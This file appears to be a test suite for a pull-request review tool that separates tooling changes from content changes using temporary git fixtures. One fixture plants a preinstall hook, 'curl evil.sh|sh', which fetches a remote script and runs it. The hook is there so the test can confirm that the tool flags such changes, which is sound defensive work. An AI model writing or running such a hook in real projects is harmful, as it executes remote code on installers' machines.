// Tooling-diff tests over real git fixtures.

import { afterAll, describe, expect, test } from "bun:test";
import { rmSync } from "node:fs";
import { computeToolingDiff, formatToolingDiff } from "../../src/review/tooling-diff.ts";
import { spawnGit } from "../../src/git-runner.ts";
import { makeFixtureRepo } from "./helpers/git-fixture.ts";

const tempDirsToClean: string[] = [];
afterAll(() => {
  for (const dir of tempDirsToClean) {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      /* fine */
    }
  }
});

describe("computeToolingDiff — content-only PR", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: "{}" },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
        { kind: "file", path: "vocab/pigments.yaml", content: "- name: base\n" },
      ],
    },
    head: {
      message: "content only",
      files: [
        { kind: "file", path: "docs/index.md", content: "# pr\n" },
        { kind: "file", path: "vocab/pigments.yaml", content: "- name: pr\n" },
      ],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  test("classifies every change as content — no tooling changes", async () => {
    const diff = await computeToolingDiff(spawnGit, fixture.repoDir, fixture.baseSha, fixture.headSha);
    expect(diff.tooling).toHaveLength(0);
    expect(diff.content.length).toBeGreaterThan(0);
    expect(formatToolingDiff(diff)).toBe("");
  });
});

describe("computeToolingDiff — tooling changed", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: '{"scripts":{}}' },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
      ],
    },
    head: {
      message: "PR tweaks scripts and edits a doc",
      files: [
        { kind: "file", path: "package.json", content: '{"scripts":{"preinstall":"curl evil.sh|sh"}}' },
        { kind: "file", path: "docs/index.md", content: "# pr\n" },
      ],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  test("tooling change surfaces on `.tooling`, content on `.content`", async () => {
    const diff = await computeToolingDiff(spawnGit, fixture.repoDir, fixture.baseSha, fixture.headSha);
    expect(diff.tooling).toHaveLength(1);
    expect(diff.tooling[0]?.kind).toBe("modify");
    if (diff.tooling[0]?.kind === "modify") {
      expect(diff.tooling[0].path).toBe("package.json");
      expect(diff.tooling[0].class).toBe("tooling");
    }
    expect(diff.content).toHaveLength(1);
    expect(formatToolingDiff(diff)).toContain("package.json");
  });
});

describe("computeToolingDiff — extension-under-content-prefix note", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [{ kind: "file", path: "docs/index.md", content: "# base\n" }],
    },
    head: {
      message: "PR adds docs/evil.js",
      files: [{ kind: "file", path: "docs/evil.js", content: "console.log('x')\n" }],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  test("under-content-prefix + wrong extension is TOOLING with the ext note", async () => {
    const diff = await computeToolingDiff(spawnGit, fixture.repoDir, fixture.baseSha, fixture.headSha);
    expect(diff.tooling).toHaveLength(1);
    const change = diff.tooling[0];
    expect(change?.class).toBe("tooling");
    if (change?.kind === "modify") {
      expect(change.path).toBe("docs/evil.js");
      expect(change.extNote).toContain("content allowlist");
    }
    // Diagnostic contains the note.
    expect(formatToolingDiff(diff)).toContain("(under content prefix");
  });
});
